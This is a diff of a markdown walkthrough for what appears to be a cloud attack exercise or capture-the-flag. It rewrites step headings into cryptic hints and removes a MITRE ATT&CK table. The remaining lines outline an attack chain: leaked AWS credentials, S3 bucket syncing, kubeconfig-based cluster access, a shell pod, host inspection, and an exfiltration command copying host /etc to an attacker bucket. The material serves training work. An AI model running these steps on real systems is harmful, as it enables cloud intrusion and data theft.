@@ -19,7 +19,8 @@ The match was meant to be routine, until someone on the team leaked the game pla
 
 ## Commands & Mapping
 
-### Step 1: Configure Leaked Cloud Credentials
+### Step 1: Something was left unlocked
+The first clue lies in plain sight - configure, but don’t question.
 
 Use the credentials to authenticate via AWS CLI.
 
@@ -34,7 +35,8 @@ aws sts get-caller-identity
 
 ---
 
-### Step 2: Discover and Access Cloud Storage
+### Step 2: They stored more than just objects
+What’s in the box may not be just files. Look deeper.
 
 List available buckets and explore their contents. Look for sensitive data like configuration files.
 
@@ -50,9 +52,8 @@ aws s3 sync s3://<bucket-name> ./downloaded-data
 
 ---
 
-### Step 3: Gain Kubernetes Cluster Access
-
-You’ve found a `kubeconfig` file in the bucket. Use it to authenticate with the Kubernetes cluster.
+### Step 3: You now speak its language
+You’ve found the map. It doesn’t shout - but it guides.
 
 **MITRE ATT&CK:**  
 T1592.002 – Gather Cloud Infra Config: Container Orchestration  
@@ -66,9 +67,9 @@ kubectl get pods -A
 
 ---
 
-### Step 4: Deploy a Container for Reconnaissance
+### Step 4: Walk among them
 
-Deploy a pod with a basic shell container to explore the cluster. This simulates lateral movement.
+Disguised as one of their own, you enter the field.
 
 **MITRE ATT&CK:**  
 T1610 – Deploy Container  
@@ -82,9 +83,9 @@ kubectl exec -it <name> -- /bin/bash
 
 ---
 
-### Step 5: Inspect Host from the Pod
+### Step 5: Beyond the container wall
 
-If the pod has access to host volumes (e.g., `/host`), explore the underlying node to simulate privilege escalation.
+What lies beneath may not be hidden - only ignored.
 
 **MITRE ATT&CK:**  
 T1057 – Process Discovery  
@@ -98,9 +99,8 @@ hostname
 
 ---
 
-### Step 6: Simulate Exfiltration of Data
-
-If credentials are available in the host or pod, use them to upload data to an attacker-controlled bucket.
+### Step 6: Leave nothing... or leave everything
+If you must leave, take a souvenir. Just don’t leave a trace.
 
 **MITRE ATT&CK:**  
 T1537 – Transfer Data to Cloud Account  
@@ -110,21 +110,6 @@ T1041 – Exfiltration Over C2 Channel
 ```bash
 aws s3 sync /host/etc s3://<your-exfil-bucket>/etc-backup
 ```
-
----
-
-## MITRE ATT&CK Summary
-
-| Stage | Techniques |
-|-------|------------|
-| Initial Access | T1528, T1552.001 |
-| Storage Discovery | T1530, T1083 |
-| Cluster Access | T1592.002, T1609 |
-| Container Deployment | T1610, T1611 |
-| Host Discovery | T1057, T1082 |
-| Data Exfiltration | T1537, T1005, T1041 |
-
----
 
 ## Usage Guidelines
 
